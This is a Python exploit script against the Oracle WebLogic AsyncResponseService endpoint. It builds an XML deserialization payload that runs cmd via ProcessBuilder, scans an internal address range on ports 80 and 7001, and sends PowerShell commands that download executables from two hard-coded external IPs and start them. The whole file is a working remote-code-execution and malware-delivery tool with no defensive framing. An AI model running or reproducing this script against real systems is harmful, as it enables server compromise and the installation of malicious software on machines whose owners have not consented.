import requests
import sys
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

cmd_base = "<string>cmd</string>\r\n"
cmd_opt = "<string>/c</string>\r\n"
cmds = ["powershell (new-object System.Net.WebClient).DownloadFile('http://39.105.202.187/agent.exe','C:/agent.exe') && start C:/agent.exe",
	"powershell (new-object System.Net.WebClient).DownloadFile('http://132.232.163.129/6666.exe','C:/6666.exe') && start C:/6666.exe"]
ports = [80,7001]

def create_payload(cmd, cmd_base, cmd_opt):
    html_escape_table = {
        "&": "&amp;",
        '"': "&quot;",
        "'": "&apos;",
        ">": "&gt;",
        "<": "&lt;",
    }
    cmd_filtered = "<string>"+"".join(html_escape_table.get(c, c) for c in cmd)+"</string>\r\n"
    payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">\r\n" \
        "<soapenv:Header>\r\n" \
        "<wsa:Action>xx</wsa:Action>\r\n" \
        "<wsa:RelatesTo>xx</wsa:RelatesTo>\r\n" \
        "<work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\r\n" \
        "<void class=\"java.lang.ProcessBuilder\">\r\n" \
        "<array class=\"java.lang.String\" length=\"3\">\r\n" \
        "<void index=\"0\">\r\n" \
        + cmd_base + \
        "</void>\r\n" \
        "<void index=\"1\">\r\n" \
        + cmd_opt + \
        "</void>\r\n" \
        "<void index=\"2\">\r\n" \
        + cmd_filtered + \
        "</void>\r\n" \
        "</array>\r\n" \
        "<void method=\"start\"/></void>\r\n" \
        "</work:WorkContext>\r\n" \
        "</soapenv:Header>\r\n" \
        "<soapenv:Body>\r\n" \
        "<asy:onAsyncDelivery/>\r\n" \
        "</soapenv:Body>\r\n" \
        "</soapenv:Envelope>"
    return payload

def exploit(url, cmd):
    header = {'content-type': 'text/xml'}
    result = requests.post(url, create_payload(cmd, cmd_base, cmd_opt), headers = header,verify=False)
    if(result.status_code == 202):
      print "Command executed"
    else:
      print "Exploit attempt failed"

for i in range(190,191):
    for port in ports:
        for cmd in cmds:
            url="http://10.100.16.%d:%d/_async/AsyncResponseService" %(i,port)
            try:
	           r=requests.get(url,timeout=5)
            except:
	           continue
            if(r.status_code==200):
                print "%s is vulnerable" %url
                exploit(url,cmd)
            else:
                print "%s is safe" %url
